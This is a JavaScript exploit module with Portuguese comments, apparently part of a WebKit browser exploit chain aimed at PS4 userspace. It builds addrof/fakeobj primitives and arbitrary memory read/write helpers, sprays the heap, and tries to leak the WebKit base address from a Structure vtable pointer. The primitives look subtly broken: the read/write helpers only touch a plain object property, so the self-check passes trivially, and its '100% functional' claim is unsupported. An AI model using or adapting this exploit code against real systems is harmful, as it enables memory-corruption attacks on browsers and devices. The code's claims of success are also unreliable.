// js/script3/testArrayBufferVictimCrash.mjs (v103 - R63 com Tentativa de Correção de Contaminação de Heap - Reinit)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Tentativa de correção de contaminação de estado re-inicializando as primitivas de L/E
// (confused_array, victim_array, leaker) *após* a verificação funcional, garantindo
// que novas alocações sejam usadas para a fase de vazamento da WebKit.
// Também adicionado um PAUSE após o reset.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v103_R63_ReinitFix";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (COM CORREÇÃO DE ESTADO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Re-inicialização da Primitiva ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    let confused_array;
    let victim_array;
    let addrof;
    let fakeobj;
    let leaker;
    let arb_read_final;
    let arb_write_final;

    try {
        // --- FASES 1-3: Configuração das Primitivas INICIAL ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        confused_array = [13.37];
        victim_array = [{ a: 1 }]; // Um objeto simples para a vítima
        
        addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };

        // Leaker inicial para verificação
        leaker = { obj_prop: null, val_prop: 0 };
        arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: i, b: 0xCAFEBABE });
        }
        const test_obj = spray[500]; // Usamos um objeto do spray para o teste
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = test_obj_addr.add(0x10); // Offset para 'a' em um objeto JS simples

        logS3(`(Verificação) Escrevendo ${value_to_write.toString(true)} no endereço ${prop_a_addr.toString(true)}...`, "info");
        arb_write_final(prop_a_addr, value_to_write);

        const value_read = arb_read_final(prop_a_addr);
        logS3(`(Verificação) Valor lido de volta: ${value_read.toString(true)}`, "leak");

        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(100); // Pequena pausa após a verificação

        // --- NOVO: Re-inicialização da Primitiva de L/E para Vazamento ---
        // Este é o ponto crucial para evitar a contaminação.
        logS3("--- CORREÇÃO: Re-inicializando primitivas 'addrof', 'fakeobj' e L/E para garantir heap limpo... ---", "info");
        
        // Zera as referências antigas para ajudar na coleta de lixo
        confused_array = null;
        victim_array = null;
        leaker = null;
        await PAUSE_S3(200); // Dá um tempo para o GC agir se possível

        // Re-declara e re-inicializa as variáveis
        confused_array = [13.37];
        victim_array = [{ dummy: 0 }]; // Um novo objeto vítima, diferente do anterior
        
        addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        
        // Novo leaker para a fase de vazamento
        leaker = { obj_prop: null, val_prop: 0 };
        arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas L/E re-inicializadas com novos objetos e referências.", "good");


        // --- FASE 5: Vazamento do Endereço Base da WebKit ---
        logS3("--- FASE 5: Vazamento do Endereço Base da WebKit (com primitivas re-inicializadas) ---", "subtest");

        // 1. Usamos um objeto diferente do spray para garantir que não haja sobreposição.
        const leak_target_obj = { f: 0xDEADBEEF }; // Um objeto fresco
        const leak_target_addr = addrof(leak_target_obj);
        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");

        // 2. Ler o ponteiro para a Estrutura (Structure) do objeto.
        const structure_addr_ptr = leak_target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_addr = arb_read_final(structure_addr_ptr);
        logS3(`[Etapa 2] Lendo do endereço ${structure_addr_ptr.toString(true)} para obter o ponteiro da Estrutura...`, "debug");
        logS3(`[Etapa 2] Endereço da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");

        // ADICIONADO: Verificação de Contaminação
        // Agora, se o `structure_addr` ainda for o `value_to_write` do teste anterior, a re-inicialização falhou.
        if (structure_addr.equals(value_to_write)) {
            throw new Error("FALHA CRÍTICA: Contaminação do heap detectada após re-inicialização! A primitiva de L/E ainda está lendo o valor de teste.");
        }
        if(structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Ponteiro da Estrutura é NULO ou inválido.");
        // Adiciona mais validações para o ponteiro da estrutura. Um endereço de estrutura típico
        // deve estar dentro de uma faixa de memória esperada (não ser muito pequeno ou muito grande, nem ter bits estranhos).
        if (structure_addr.high() !== 0x7FFF0000 && structure_addr.high() !== 0x00000000) { // Exemplo de validação para PS4 userspace addresses
             logS3(`[Etapa 2] ALERTA: high part do Structure Address inesperado: ${toHex(structure_addr.high())}`, "warn");
        }


        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura.
        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        const jsobject_put_addr = arb_read_final(vfunc_put_ptr_addr);
        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure + 0x18) para obter o ponteiro da vfunc...`, "debug");
        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
        // Validação semelhante para o ponteiro da função.
        if (jsobject_put_addr.high() !== 0x7FFF0000 && jsobject_put_addr.high() !== 0x00000000) {
            logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
        }


        // 4. Calcular o endereço base da WebKit.
        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");

        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        // Limpar referências globais após o teste para evitar mais contaminação
        // (embora as variáveis locais já ajudem muito)
        confused_array = null;
        victim_array = null;
        leaker = null;
        addrof = null;
        fakeobj = null;
        arb_read_final = null;
        arb_write_final = null;
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    // Estrutura de retorno permanece a mesma
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Corrected by Reinit)' }
    };
}
